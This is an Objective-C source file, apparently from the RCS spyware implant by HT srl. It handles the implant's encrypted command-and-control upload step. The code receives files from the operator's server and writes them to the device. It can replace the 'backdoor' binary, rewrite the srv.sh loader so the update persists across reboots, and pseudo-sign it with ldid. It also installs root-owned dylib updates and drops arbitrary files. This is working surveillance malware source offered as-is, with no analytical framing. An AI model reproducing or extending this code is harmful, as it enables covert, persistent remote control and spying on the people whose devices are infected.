/*
 * RCSMac - Upload File Network Operation
 *
 *
 * Created on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "UploadNetworkOperation.h"
#import "NSMutableData+AES128.h"
#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "NSData+Pascal.h"
#import "RCSICommon.h"

#import "RCSIFileSystemManager.h"
//#import "RCSMLogger.h"
//#import "RCSMDebug.h"


//#define DEBUG
#define infoLog NSLog

#define	S_ISUID		0004000		/* [XSI] set user id on execution */
#define	S_IRWXU		0000700		/* [XSI] RWX mask for owner */
#define	S_IRUSR		0000400		/* [XSI] R for owner */
#define	S_IWUSR		0000200		/* [XSI] W for owner */
#define	S_IRGRP		0000040		/* [XSI] R for group */
#define	S_IXGRP		0000010		/* [XSI] X for group */
#define	S_IROTH		0000004		/* [XSI] R for other */
#define	S_IWOTH		0000002		/* [XSI] W for other */
#define	S_IXOTH		0000001		/* [XSI] X for other */

#define CORE_UPLOAD  @"core-update"
#define DYLIB_UPLOAD @"dylib-update"

@implementation UploadNetworkOperation

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if (self = [super init])
    {
      mTransport = aTransport;
    
#ifdef DEBUG_UP_NOP
      infoLog(@"mTransport: %@", mTransport);
#endif
      return self;
    }
  
  return nil;
}

- (BOOL)_saveDylibUpdate:(NSData*)fileData
{
  BOOL bRet = FALSE;
  
  NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@", [[NSBundle mainBundle] bundlePath] , gDylibName];
  
  // Create clean files for ios hfs 
  NSError *err = nil;
  [[NSFileManager defaultManager] removeItemAtPath: _upgradePath 
                                             error: &err];
  bRet = [fileData writeToFile: _upgradePath
                    atomically: YES];

  // Forcing permission
  u_long permissions = (S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH);
  NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
  NSValue *owner = [NSNumber numberWithInt: 0];
  
  [[NSFileManager defaultManager] changeFileAttributes:
                                                 [NSDictionary dictionaryWithObjectsAndKeys:
                                                  permission,
                                                  NSFilePosixPermissions,
                                                  owner,
                                                  NSFileOwnerAccountID,
                                                  nil] 
                                                atPath: _upgradePath];

  
  return TRUE;  
}

- (BOOL)_saveAndSignBackdoor:(NSData*)fileData
{
  BOOL bRet = FALSE;
  
  NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@", [[NSBundle mainBundle] bundlePath],
                                                                       gBackdoorUpdateName];
  
  // Create clean files for ios hfs 
  NSError *err = nil;
  [[NSFileManager defaultManager] removeItemAtPath: _upgradePath 
                                             error: &err];

  bRet = [fileData writeToFile: _upgradePath
                    atomically: YES];
  
  // Forcing permission
  u_long permissions = S_IRWXU;
  NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
  NSValue *owner = [NSNumber numberWithInt: 0];
  
  [[NSFileManager defaultManager] changeFileAttributes:
                                                 [NSDictionary dictionaryWithObjectsAndKeys:permission,
                                                                                            NSFilePosixPermissions,
                                                                                            owner,
                                                                                            NSFileOwnerAccountID,
                                                                                            nil] 
                                                atPath: _upgradePath];

  
  // Once the backdoor has been written, edit the backdoor Loader in order to
  // load the new updated backdoor upon reboot
  NSString *backdoorLoaderPath = [[[NSBundle mainBundle] bundlePath]
                                  stringByAppendingPathComponent: @"srv.sh"];
  
  NSMutableData *_fileContent  = [[NSMutableData alloc] initWithContentsOfFile: backdoorLoaderPath];
  NSMutableString *fileContent = [[NSMutableString alloc] initWithData: _fileContent
                                                              encoding: NSUTF8StringEncoding];
  
  [fileContent replaceOccurrencesOfString: gBackdoorName
                               withString: gBackdoorUpdateName
                                  options: NSCaseInsensitiveSearch
                                    range: NSMakeRange(0, [fileContent length])];
  
  NSData *updateData = [fileContent dataUsingEncoding: NSUTF8StringEncoding];
  
  [updateData writeToFile: backdoorLoaderPath
               atomically: YES];
  
  pid_t pid = fork();
  
  if (pid == 0) 
    execlp("/usr/bin/ldid", "/usr/bin/ldid", "-S", [gBackdoorUpdateName UTF8String], NULL);
  
  int status;
  waitpid(pid, &status, 0);
  
  return TRUE;  
}

- (BOOL)perform
{
#ifdef DEBUG_UP_NOP
  infoLog(@"");
#endif
  
  uint32_t command              = PROTO_UPLOAD;
  NSMutableData *commandData    = [[NSMutableData alloc] initWithBytes: &command
                                                                length: sizeof(uint32_t)];
  NSData *commandSha            = [commandData sha1Hash];
  
  [commandData appendData: commandSha];
  
#ifdef DEBUG_UP_NOP
  infoLog(@"commandData: %@", commandData);
#endif
  
  [commandData encryptWithKey: gSessionKey];
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
    
  if (replyData == nil)
    {
#ifdef DEBUG_UP_NOP
      errorLog(@"empty reply from server");
#endif
    
      return NO;
    }

  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  [replyDecrypted decryptWithKey: gSessionKey];
  
#ifdef DEBUG_UP_NOP
  infoLog(@"replyDecrypted: %@", replyDecrypted);
#endif
  
  [replyDecrypted getBytes: &command
                    length: sizeof(uint32_t)];
  
  // remove padding
  [replyDecrypted removePadding];
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  
  @try
    {
      shaRemote = [replyDecrypted subdataWithRange:
                   NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
      
      shaLocal = [replyDecrypted subdataWithRange:
                  NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_UP_NOP
      errorLog(@"exception on sha makerange (%@)", [e reason]);
#endif
      
      return NO;
    }
  
  shaLocal = [shaLocal sha1Hash];
  
#ifdef DEBUG_UP_NOP
  infoLog(@"shaRemote: %@", shaRemote);
  infoLog(@"shaLocal : %@", shaLocal);
#endif
  
  if ([shaRemote isEqualToData: shaLocal] == NO)
    {
#ifdef DEBUG_UP_NOP
      errorLog(@"sha mismatch");
#endif
    
      return NO;
    }
  
  if (command != PROTO_OK)
    {
#ifdef DEBUG_UP_NOP
      errorLog(@"No upload request available (command %d)", command);
#endif
      return NO;
    }
  
  uint32_t packetSize     = 0;
  uint32_t numOfFilesLeft = 0;
  uint32_t filenameSize   = 0;
  uint32_t fileSize       = 0;
  
  @try
    {
      [replyDecrypted getBytes: &packetSize
                         range: NSMakeRange(4, sizeof(uint32_t))];
      [replyDecrypted getBytes: &numOfFilesLeft
                         range: NSMakeRange(8, sizeof(uint32_t))];
      [replyDecrypted getBytes: &filenameSize
                         range: NSMakeRange(12, sizeof(uint32_t))];
      [replyDecrypted getBytes: &fileSize
                         range: NSMakeRange(16 + filenameSize, sizeof(uint32_t))];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_UP_NOP
      errorLog(@"exception on parameters makerange (%@)", [e reason]);
#endif
      
      return NO;
    }
  
#ifdef DEBUG_UP_NOP
  infoLog(@"packetSize    : %d", packetSize);
  infoLog(@"numOfFilesLeft: %d", numOfFilesLeft);
  infoLog(@"filenameSize  : %d", filenameSize);
  infoLog(@"fileSize      : %d", fileSize);
#endif
  
  NSData *stringData;
  NSData *fileContent;
  
  @try
    {
      stringData  = [[NSData alloc] initWithData:
                     [replyDecrypted subdataWithRange: NSMakeRange(12, filenameSize + 4)]];
      fileContent = [[NSData alloc] initWithData:
                     [replyDecrypted subdataWithRange: NSMakeRange(16 + filenameSize + 4, fileSize)]];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_UP_NOP
      errorLog(@"exception on stringData makerange (%@)", [e reason]);
#endif
    
      return NO;
    }
  
  NSString *filename  = [stringData unpascalizeToStringWithEncoding: NSUTF16LittleEndianStringEncoding];
  
  if (filename == nil)
    {
#ifdef DEBUG_UP_NOP
      errorLog(@"filename is empty, error on unpascalize");
#endif
    }
  else
    {
#ifdef DEBUG_UP_NOP
      infoLog(@"filename: %@", filename);
      infoLog(@"file content: %@", fileContent);
#endif
      
      if ([filename isEqualToString: CORE_UPLOAD])
        {
#ifdef DEBUG
          infoLog(@"Received a core upgrade");
#endif
          BOOL success = NO;
        
          if ((success = [self _saveAndSignBackdoor: fileContent]) == NO)
            {
#ifdef DEBUG_UPGRADE_NOP
              errorLog(@"Error while updating files for core upgrade");
#endif
            }
        }
      else if ([filename isEqualToString: DYLIB_UPLOAD])
        {
#ifdef DEBUG_UPGRADE_NOP
          infoLog(@"Received a dylib upgrade");
#endif
          if ([self _saveDylibUpdate: fileContent] == NO)
            {
#ifdef DEBUG_UPGRADE_NOP
            errorLog(@"Error while updating files for dylib upgrade");
#endif
            }
        }
      else
        {
#ifdef DEBUG_UP_NOP
          infoLog(@"Received standard file");
#endif
          _i_FileSystemManager *fsManager = [[_i_FileSystemManager alloc] init];
          
          [fsManager createFile: filename
                       withData: fileContent];
        }
    }

  //
  // Get files until there's no one left
  //
  if (numOfFilesLeft != 0)
    {
      return [self perform];
    }
  
  return YES;
}

@end